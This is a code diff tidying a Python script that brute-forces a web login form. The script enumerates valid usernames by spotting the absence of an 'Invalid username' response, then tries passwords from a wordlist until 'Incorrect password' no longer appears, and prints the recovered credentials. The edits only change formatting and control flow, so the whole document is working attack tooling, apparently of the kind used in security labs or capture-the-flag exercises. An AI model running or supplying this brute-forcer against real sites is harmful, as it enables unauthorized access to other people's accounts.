@@ -6,9 +6,9 @@ import getopt
 
 def clear_screen():
   if os.name == 'posix':
-    clear_window = os.system('clear')
+    os.system('clear')
   else:
-    clear_window = os.system('cls')
+    os.system('cls')
 
 
 def get_username(url, session):
@@ -16,19 +16,15 @@ def get_username(url, session):
 
   for username in usernames:
     username = username.strip()
-    data = {'username' : username, 'password' : 'a'}
-    post_r = session.post(url, data = data)
+    data = {'username': username, 'password': 'a'}
+    post_r = session.post(url, data=data)
     clear_screen()
     print(f"[!] The username is: \"{username}\"")
 
     if "Invalid username" not in post_r.text:
       valid_username = username
-      clear_screen()
-      print(f"[*] The username is: \"{valid_username}\"")
       usernames.close()
-      break
-
-  return valid_username
+      return valid_username
 
 
 def get_password(url, session, valid_username):
@@ -36,17 +32,15 @@ def get_password(url, session, valid_username):
 
   for password in passwords:
     password = password.strip()
-    obj = {'username' : valid_username, 'password' : password}
-    post_r = session.post(url, data = obj)
+    data = {'username': valid_username, 'password': password}
+    post_r = session.post(url, data=data)
     clear_screen()
     print(f"[*] The username is: \"{valid_username}\"\n[!] The password is: \"{password}\"")
 
     if "Incorrect password" not in post_r.text:
       valid_password = password
       passwords.close()
-      break
-
-  return valid_password
+      return valid_password
 
 
 def main(argv):
@@ -69,6 +63,7 @@ def main(argv):
   username = get_username(url, session)
   password = get_password(url, session, username)
   clear_screen()
+
   print(f"[*] The username is: \"{username}\"\n[*] The password is: \"{password}\"")
 
 
